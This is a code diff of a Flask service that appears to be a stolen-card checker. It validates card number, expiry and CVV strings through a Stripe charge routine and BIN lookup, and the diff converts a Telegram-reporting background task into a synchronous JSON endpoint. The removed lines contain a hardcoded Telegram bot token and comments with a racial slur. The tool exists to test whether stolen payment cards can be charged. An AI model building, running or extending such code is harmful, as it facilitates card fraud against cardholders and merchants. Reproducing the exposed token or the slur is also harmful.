@@ -1,15 +1,10 @@
 from flask import Flask, request, jsonify
 import requests
 import re
-import threading
-
-#Nigggaassssssssss
-BOT_TOKEN = '8294313536:AAEbstNMHutpUDxUwaxvwJleW4wAxiLAoio'
-TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
 
 app = Flask(__name__)
 
-#Fulllllll Nigaas
+# --- Stripe Charge - Full Synchronous Checking Logic ---
 def stripe_charge_full_check(cc, mm, yy, cvv):
     session = requests.Session()
     session.headers.update({
@@ -68,43 +63,35 @@ def get_bin_info(bin_number):
         return response.json() if response.status_code == 200 else {}
     except Exception: return {}
 
-# --- Background Task Function ---
-def background_task(chat_id, message_id, full_cc_string):
-    cc, mm, yy, cvv = full_cc_string.split('|')
+# --- NEW SYNCHRONOUS API ENDPOINT ---
+@app.route('/stripe_charge', methods=['GET'])
+def stripe_charge_endpoint():
+    card_str = request.args.get('card')
+    if not card_str:
+        return jsonify({"error": "Please provide card details using ?card=..."}), 400
+
+    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
+    if not match:
+        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400
+
+    cc, mm, yy, cvv = match.groups()
+    
+    # Yahan par lamba process hoga aur API intezaar karega
     check_result = stripe_charge_full_check(cc, mm, yy, cvv)
     bin_info = get_bin_info(cc[:6])
 
-    status = check_result.get('status', 'Declined')
-    response_message = check_result.get('response', 'No response.')
-    brand = bin_info.get('brand', 'Unknown')
-    card_type = bin_info.get('type', 'Unknown')
-    country = bin_info.get('country_name', 'Unknown')
-    country_flag = bin_info.get('country_flag', '')
-    bank = bin_info.get('bank', 'Unknown')
-
-    if status == "Approved":
-        final_message = f"""<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ (Stripe Charge)</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
-    else:
-        final_message = f"""<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ (Stripe Charge)</b>\n\n<b>𝗖𝗮𝗿𝗱:</b> <code>{full_cc_string}</code>\n<b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response_message}\n\n<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}\n<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}\n<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}"""
-
-    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': final_message, 'parse_mode': 'HTML'}
-    requests.post(TELEGRAM_API_URL, json=payload)
-
-# --- API Endpoint ---
-@app.route('/stripe_charge_async', methods=['POST'])
-def stripe_charge_async_endpoint():
-    data = request.get_json()
-    chat_id = data.get('chat_id')
-    message_id = data.get('message_id')
-    card_str = data.get('card')
-
-    if not all([chat_id, message_id, card_str]):
-        return jsonify({"error": "Missing chat_id, message_id, or card"}), 400
-
-    thread = threading.Thread(target=background_task, args=(chat_id, message_id, card_str))
-    thread.start()
-
-    return jsonify({"status": "Process started in background."})
+    final_result = {
+        "status": check_result["status"],
+        "response": check_result["response"],
+        "bin_info": {
+            "brand": bin_info.get('brand', 'Unknown'), "type": bin_info.get('type', 'Unknown'),
+            "country": bin_info.get('country_name', 'Unknown'), "country_flag": bin_info.get('country_flag', ''),
+            "bank": bin_info.get('bank', 'Unknown'),
+        }
+    }
+    # Final result direct return hoga
+    return jsonify(final_result)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
+
